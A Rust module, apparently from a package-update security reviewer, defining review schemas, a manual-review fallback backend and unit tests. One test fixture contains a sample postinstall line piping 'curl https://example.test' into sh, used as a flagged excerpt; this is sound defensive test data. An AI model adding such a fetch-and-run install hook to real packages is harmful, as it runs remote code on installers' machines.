use std::error::Error;
use std::fmt;

use serde::{Deserialize, Serialize};

use crate::config::ReviewProvider;
use crate::diff::{DiffSummary, SuspiciousExcerpt};
use crate::signals::Signal;

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ReviewVerdict {
    Benign,
    Suspicious,
    #[default]
    NeedsReview,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Confidence {
    #[default]
    Low,
    Medium,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ReviewSummary {
    pub files_added: usize,
    pub files_removed: usize,
    pub files_changed: usize,
    pub signals: Vec<String>,
}

impl ReviewSummary {
    pub fn from_diff_and_signals(diff: &DiffSummary, signals: &[Signal]) -> Self {
        Self {
            files_added: diff.files_added,
            files_removed: diff.files_removed,
            files_changed: diff.files_changed,
            signals: signals
                .iter()
                .copied()
                .map(Signal::as_str)
                .map(str::to_string)
                .collect(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ReviewInput {
    pub ecosystem: String,
    pub package: String,
    pub old_version: String,
    pub new_version: String,
    pub summary: ReviewSummary,
    pub manifest_diff: Option<String>,
    pub interesting_files: Vec<SuspiciousExcerpt>,
}

#[derive(Debug, Clone)]
pub struct ReviewInputAnalysis {
    pub ecosystem: String,
    pub package: String,
    pub old_version: String,
    pub new_version: String,
    pub manifest_diff: Option<String>,
    pub interesting_files: Vec<SuspiciousExcerpt>,
}

impl ReviewInput {
    pub fn from_analysis(
        analysis: ReviewInputAnalysis,
        diff: &DiffSummary,
        signals: &[Signal],
    ) -> Self {
        Self {
            ecosystem: analysis.ecosystem,
            package: analysis.package,
            old_version: analysis.old_version,
            new_version: analysis.new_version,
            summary: ReviewSummary::from_diff_and_signals(diff, signals),
            manifest_diff: analysis.manifest_diff,
            interesting_files: analysis.interesting_files,
        }
    }

    pub fn to_json_pretty(&self) -> Result<String, ReviewSchemaError> {
        serde_json::to_string_pretty(self).map_err(ReviewSchemaError::Serialize)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ReviewOutput {
    pub verdict: ReviewVerdict,
    pub confidence: Confidence,
    pub reasons: Vec<String>,
    pub focus_files: Vec<String>,
}

impl ReviewOutput {
    pub fn from_json_str(input: &str) -> Result<Self, ReviewSchemaError> {
        let output = serde_json::from_str::<Self>(input).map_err(ReviewSchemaError::Deserialize)?;
        output.validate()?;
        Ok(output)
    }

    pub fn to_json_pretty(&self) -> Result<String, ReviewSchemaError> {
        serde_json::to_string_pretty(self).map_err(ReviewSchemaError::Serialize)
    }

    pub fn validate(&self) -> Result<(), ReviewSchemaError> {
        if self.reasons.iter().any(|reason| reason.trim().is_empty()) {
            return Err(ReviewSchemaError::Validation(
                "review reasons must not contain empty strings".to_string(),
            ));
        }

        if self
            .focus_files
            .iter()
            .any(|focus_file| focus_file.trim().is_empty())
        {
            return Err(ReviewSchemaError::Validation(
                "review focus_files must not contain empty strings".to_string(),
            ));
        }

        Ok(())
    }
}

pub trait Reviewer {
    fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError>;
}

#[derive(Debug, Clone, Default)]
pub struct NoneReviewer;

impl Reviewer for NoneReviewer {
    fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError> {
        let focus_files = input
            .interesting_files
            .iter()
            .map(|excerpt| excerpt.path.clone())
            .collect::<Vec<_>>();

        Ok(ReviewOutput {
            verdict: ReviewVerdict::NeedsReview,
            confidence: Confidence::Low,
            reasons: vec![
                "review backend is disabled (provider=none); manual review required".to_string(),
            ],
            focus_files,
        })
    }
}

#[derive(Debug, Clone, Default)]
pub enum ReviewBackend {
    #[default]
    None(NoneReviewer),
}

impl ReviewBackend {
    pub fn from_provider(provider: ReviewProvider) -> Result<Self, ReviewBackendError> {
        match provider {
            ReviewProvider::None => Ok(Self::None(NoneReviewer)),
            ReviewProvider::Codex | ReviewProvider::ClaudeCode => {
                Err(ReviewBackendError::UnsupportedProvider(provider))
            }
        }
    }

    pub fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError> {
        match self {
            Self::None(reviewer) => reviewer.review(input),
        }
    }
}

#[derive(Debug)]
pub enum ReviewSchemaError {
    Serialize(serde_json::Error),
    Deserialize(serde_json::Error),
    Validation(String),
}

impl fmt::Display for ReviewSchemaError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Serialize(source) => {
                write!(f, "failed to serialize review schema json: {source}")
            }
            Self::Deserialize(source) => {
                write!(f, "failed to deserialize review schema json: {source}")
            }
            Self::Validation(message) => write!(f, "invalid review schema: {message}"),
        }
    }
}

impl Error for ReviewSchemaError {
    fn source(&self) -> Option<&(dyn Error + 'static)> {
        match self {
            Self::Serialize(source) | Self::Deserialize(source) => Some(source),
            Self::Validation(_) => None,
        }
    }
}

#[derive(Debug)]
pub enum ReviewBackendError {
    UnsupportedProvider(ReviewProvider),
}

impl fmt::Display for ReviewBackendError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedProvider(provider) => write!(
                f,
                "review backend `{}` is not implemented yet",
                review_provider_label(provider)
            ),
        }
    }
}

impl Error for ReviewBackendError {}

fn review_provider_label(provider: &ReviewProvider) -> &'static str {
    match provider {
        ReviewProvider::None => "none",
        ReviewProvider::Codex => "codex",
        ReviewProvider::ClaudeCode => "claude-code",
    }
}

#[cfg(test)]
mod tests {
    use crate::diff::{DiffSummary, SuspiciousExcerpt};
    use crate::signals::Signal;

    use super::{
        Confidence, NoneReviewer, ReviewBackend, ReviewInput, ReviewInputAnalysis, ReviewOutput,
        ReviewProvider, ReviewSummary, ReviewVerdict, Reviewer,
    };

    #[test]
    fn serializes_reviewer_input_schema() {
        let input = ReviewInput::from_analysis(
            ReviewInputAnalysis {
                ecosystem: "npm".to_string(),
                package: "axios".to_string(),
                old_version: "1.8.0".to_string(),
                new_version: "1.9.0".to_string(),
                manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
                interesting_files: vec![SuspiciousExcerpt {
                    path: "package.json".to_string(),
                    reason: "install script changed".to_string(),
                    excerpt: "   4: \"postinstall\": \"curl https://example.test | sh\""
                        .to_string(),
                }],
            },
            &DiffSummary {
                files_added: 3,
                files_removed: 1,
                files_changed: 12,
                ..DiffSummary::default()
            },
            &[Signal::DependencyAdded, Signal::InstallScriptAdded],
        );

        let json = input.to_json_pretty().expect("input json should serialize");
        let value: serde_json::Value =
            serde_json::from_str(&json).expect("input json should parse");

        assert_eq!(value["ecosystem"], "npm");
        assert_eq!(value["package"], "axios");
        assert_eq!(value["old_version"], "1.8.0");
        assert_eq!(value["new_version"], "1.9.0");
        assert_eq!(value["summary"]["files_added"], 3);
        assert_eq!(value["summary"]["files_removed"], 1);
        assert_eq!(value["summary"]["files_changed"], 12);
        assert_eq!(
            value["summary"]["signals"],
            serde_json::json!(["dependency-added", "install-script-added"])
        );
        assert_eq!(
            value["manifest_diff"],
            "--- old/package.json\n+++ new/package.json\n"
        );
        assert_eq!(value["interesting_files"][0]["path"], "package.json");
        assert_eq!(
            value["interesting_files"][0]["reason"],
            "install script changed"
        );
    }

    #[test]
    fn serializes_review_summary_from_diff_and_signals() {
        let summary = ReviewSummary::from_diff_and_signals(
            &DiffSummary {
                files_added: 1,
                files_removed: 2,
                files_changed: 3,
                ..DiffSummary::default()
            },
            &[Signal::DependencyAdded, Signal::EntrypointChanged],
        );

        assert_eq!(summary.files_added, 1);
        assert_eq!(summary.files_removed, 2);
        assert_eq!(summary.files_changed, 3);
        assert_eq!(
            summary.signals,
            vec!["dependency-added", "entrypoint-changed"]
        );
    }

    #[test]
    fn parses_reviewer_output_schema() {
        let output = ReviewOutput::from_json_str(
            r#"{
              "verdict": "suspicious",
              "confidence": "high",
              "reasons": ["new install script"],
              "focus_files": ["package.json"]
            }"#,
        )
        .expect("output json should deserialize");

        assert_eq!(output.verdict, ReviewVerdict::Suspicious);
        assert_eq!(output.confidence, Confidence::High);
        assert_eq!(output.reasons, vec!["new install script"]);
        assert_eq!(output.focus_files, vec!["package.json"]);
    }

    #[test]
    fn rejects_invalid_reviewer_output_schema() {
        let error = ReviewOutput::from_json_str(
            r#"{
              "verdict": "needs-review",
              "confidence": "low",
              "reasons": [""],
              "focus_files": ["package.json"]
            }"#,
        )
        .expect_err("empty reason should fail validation");

        assert!(error
            .to_string()
            .contains("review reasons must not contain empty strings"));
    }

    #[test]
    fn serializes_reviewer_output_schema() {
        let output = ReviewOutput {
            verdict: ReviewVerdict::Benign,
            confidence: Confidence::Medium,
            reasons: vec!["no suspicious changes detected".to_string()],
            focus_files: vec!["README.md".to_string()],
        };

        let json = output
            .to_json_pretty()
            .expect("output json should serialize");
        let value: serde_json::Value =
            serde_json::from_str(&json).expect("output json should parse");

        assert_eq!(value["verdict"], "benign");
        assert_eq!(value["confidence"], "medium");
        assert_eq!(value["reasons"][0], "no suspicious changes detected");
        assert_eq!(value["focus_files"][0], "README.md");
    }

    #[test]
    fn none_reviewer_returns_manual_review_result() {
        let reviewer = NoneReviewer;
        let input = ReviewInput::from_analysis(
            ReviewInputAnalysis {
                ecosystem: "npm".to_string(),
                package: "axios".to_string(),
                old_version: "1.8.0".to_string(),
                new_version: "1.9.0".to_string(),
                manifest_diff: None,
                interesting_files: vec![SuspiciousExcerpt {
                    path: "package.json".to_string(),
                    reason: "install script changed".to_string(),
                    excerpt: "postinstall".to_string(),
                }],
            },
            &DiffSummary::default(),
            &[],
        );

        let output = reviewer
            .review(&input)
            .expect("none reviewer should succeed");

        assert_eq!(output.verdict, ReviewVerdict::NeedsReview);
        assert_eq!(output.confidence, Confidence::Low);
        assert_eq!(
            output.reasons,
            vec!["review backend is disabled (provider=none); manual review required"]
        );
        assert_eq!(output.focus_files, vec!["package.json"]);
    }

    #[test]
    fn backend_factory_supports_none_provider() {
        let backend = ReviewBackend::from_provider(ReviewProvider::None)
            .expect("none provider should be supported");
        let input = ReviewInput::default();
        let output = backend.review(&input).expect("none backend should review");

        assert_eq!(output.verdict, ReviewVerdict::NeedsReview);
        assert_eq!(output.confidence, Confidence::Low);
    }

    #[test]
    fn backend_factory_rejects_unimplemented_providers() {
        let codex_error = ReviewBackend::from_provider(ReviewProvider::Codex)
            .expect_err("codex backend should not be implemented yet");
        assert_eq!(
            codex_error.to_string(),
            "review backend `codex` is not implemented yet"
        );

        let claude_error = ReviewBackend::from_provider(ReviewProvider::ClaudeCode)
            .expect_err("claude backend should not be implemented yet");
        assert_eq!(
            claude_error.to_string(),
            "review backend `claude-code` is not implemented yet"
        );
    }
}
